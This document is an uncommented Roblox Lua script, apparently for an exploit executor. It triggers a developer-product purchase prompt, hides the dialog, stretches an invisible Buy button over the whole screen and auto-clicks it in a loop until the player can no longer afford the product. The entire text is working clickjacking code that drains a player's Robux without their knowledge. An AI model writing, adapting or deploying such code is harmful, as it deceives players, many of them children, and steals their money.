wait(5)
print("started")
local canbuy = true

local function BuyAttempt()
	game:GetService("MarketplaceService"):PromptProductPurchase(game.Players.LocalPlayer, 1932297319)
	local coreG = game:GetService("CoreGui")
	local prompt = coreG:WaitForChild("PurchasePrompt")
	local container = prompt:WaitForChild("ProductPurchaseContainer")
	local animator = container:WaitForChild("Animator")
	local prompt2 = animator:WaitForChild("Prompt")
	local alertCont = prompt2:WaitForChild("AlertContents")
	local footer = alertCont:WaitForChild("Footer")
	local buttons = footer:WaitForChild("Buttons")
	local buyButton = buttons:WaitForChild("2")

	prompt.Enabled = false
	task.wait(3)

	if buyButton.ButtonContent.ButtonMiddleContent.Text.Text == "Buy Robux" then
		canbuy = false
		prompt2:Destroy()
		prompt.Enabled = true
	else
		canbuy = true
		buyButton.Parent = prompt
		prompt2:Destroy()
		prompt.Enabled = true


		buyButton.Size = UDim2.new(1,0,1,0)
		buyButton.ImageTransparency = 1
		buyButton:WaitForChild("ButtonContent").Visible = false
		buyButton.Changed:Connect(function()
			buyButton.ImageTransparency = 1
			if not buyButton.Visible then
				buyButton:Destroy()
			end
		end)

		local wasAddded = false
		local fulldone = false

		animator.ChildAdded:Connect(function(c)
			pcall(function()
				buyButton:Destroy()
			end)
			if not wasAddded then
				wasAddded = true
				local prompt2 = animator:WaitForChild("Prompt")
				local alertCont = prompt2:WaitForChild("AlertContents")
				local footer = alertCont:WaitForChild("Footer")
				local buttons = footer:WaitForChild("Buttons")
				local buyButton = buttons:WaitForChild("1")
				buyButton.Parent = prompt
				prompt2.Visible = false
				buyButton.ImageTransparency = 1
				buyButton:WaitForChild("ButtonContent").Visible = false
				buyButton.Size = UDim2.new(1,0,1,0)
				while prompt2.Parent~=nil do
					wait()
				end
				buyButton:Destroy()
				fulldone = true
			end
		end)

		while not fulldone do
			mouse1click()
			wait()
		end
	end
end

while canbuy do
	BuyAttempt()
	wait(1)
end
